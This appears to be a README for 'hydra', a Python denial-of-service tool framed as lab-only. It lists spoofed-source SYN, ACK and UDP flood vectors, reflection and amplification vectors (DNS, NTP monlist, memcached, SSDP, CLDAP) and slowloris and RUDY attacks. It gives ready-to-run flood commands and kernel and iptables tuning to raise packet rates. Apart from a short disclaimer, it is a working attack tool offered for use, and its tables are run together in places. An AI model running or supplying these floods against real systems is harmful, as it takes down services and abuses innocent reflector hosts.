# hydra

Multi-vector packet and request traffic engine for isolated Linux lab environments.
Supports raw layer-4, reflection/amplification simulation, and layer-7 HTTP workloads
(`syn`, `ack`, `psh`, `udp`, `dns`, `ntp`, `memcached`, `ssdp`, `cldap`, `http`, `slowloris`, `rudy`)
using Python's standard library only — zero external runtime dependencies.

**Status:** 1.0.0 — tested on Debian 12, Ubuntu 24.04, kernel 6.x, Python 3.10–3.13.

---

## Install & Preflight

```bash
git clone [https://github.com/ziyadxshabi/DDos-educational.git](https://github.com/ziyadxshabi/DDos-educational.git) hydra
cd hydra
python3 -m hydra 127.0.0.1 -m http --check
Raw L4 vectors require root or CAP_NET_RAW on Linux; L7 vectors run unprivileged.Kernel Tuning (Linux Lab Hosts)Untuned Linux boxes bottleneck around ~200 kpps due to socket send buffers and nf_conntrack:Bashsudo cp config/99-hydra.conf /etc/sysctl.d/99-hydra.conf
sudo sysctl --system
sudo iptables -t raw -A PREROUTING -p tcp --dport 80 -j NOTRACK
sudo iptables -t raw -A PREROUTING -p tcp --dport 443 -j NOTRACK
Full details and revert commands: docs/02-tuning.md.UsageBash# Layer-4 TCP vectors across 4 processes (isolated lab target)
sudo python3 -m hydra 192.0.2.10 -p 443 -m syn,ack,psh --spoof 10.0.0.0/8 --procs 4 -t 32 -d 120

# Reflected DNS lab simulation with custom resolver list
sudo python3 -m hydra 192.0.2.10 -m dns --domain lab.local --resolvers ./lab-dns.txt -r 2000

# Layer-7 HTTP workload (unprivileged)
python3 -m hydra 192.0.2.10 -p 443 --ssl -m http --http-method POST -t 200 -r 50

# Preflight check without sending traffic
python3 -m hydra 192.0.2.10 -p 443 -m all --check
FlagMeaning-mComma-separated vectors, or all-tTotal worker threads, split across --procs--procsWorker processes (bypasses the Python GIL)-rOperations/sec per worker (0 = unthrottled)--spoofauto, off (uses host IP), or a source CIDR-dDuration in seconds--junkPad raw TCP SYN packets with random bytes--checkPrint resolved target/capability report and exitVectorsVectorLayerSpoofs SourceLab Use CasesynL4yesTCP SYN backlog and SYN-cookie testingackL4yesStateful firewall and conntrack table evaluationpshL4yesTCP payload processing throughputudpL4yesRaw UDP bandwidth and packet-rate testingdnsL4 reflyesEDNS0 4096-byte buffer amplification mechanicsntpL4 reflyesLegacy NTP mode-7 monlist packet structurememcachedL4 reflyesUDP stats items amplification mechanicsssdpL4 reflyesUPnP M-SEARCH discovery behaviorcldapL4 reflyesConnectionless LDAP rootDSE query behaviorhttpL7noHTTP/HTTPS request concurrencyslowlorisL7noPartial HTTP header accumulationrudyL7noSlow HTTP POST body transmissionDocs & Legal01 — Vectors · 02 — Tuning · 05 — Scale · 06 — Troubleshooting · 07 — Legal · 08 — RoadmapAuthorized educational and isolated lab testing only. See docs/07-legal.md and CONTRIBUTING.md.